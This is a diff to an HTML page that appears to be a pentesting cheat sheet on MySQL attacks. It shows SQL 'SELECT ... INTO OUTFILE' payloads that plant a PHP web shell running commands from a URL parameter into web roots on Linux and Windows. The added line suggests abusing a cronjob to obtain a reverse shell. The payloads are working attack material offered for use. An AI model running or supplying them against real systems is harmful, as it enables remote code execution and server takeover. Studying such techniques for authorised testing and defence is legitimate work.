@@ -47,10 +47,12 @@
                     <pre><code class="language-sql">show variables like "secure_file_priv";</code></pre>
                     <p>In case it's empty or it is located only in a specific folder we can try to perform</p>
                     <b>Linux</b>
+                    
                     <pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE '/var/www/html/webshell.php';</code></pre>
                     <b>Windows</b>
                     <p>Rmember that there is no \ in case you would like to use them you could do \\</p>
                     <pre><code class="language-sql">SELECT "&lt;?php echo shell_exec($_GET['c']);?&gt;" INTO OUTFILE 'C:/xampp/htdocs/dashboard/mytest.php';</code></pre>
+                    <p>From here you should try to locate some cronjob and attempt to write a simple file in order to get executed by a user inside a machine. Then you'll get a reverse shell</p>
                 </ul>
                 <h3>File read</h3>
                 <p>In case you have the READ permissions you are able to read system files by doing</p>
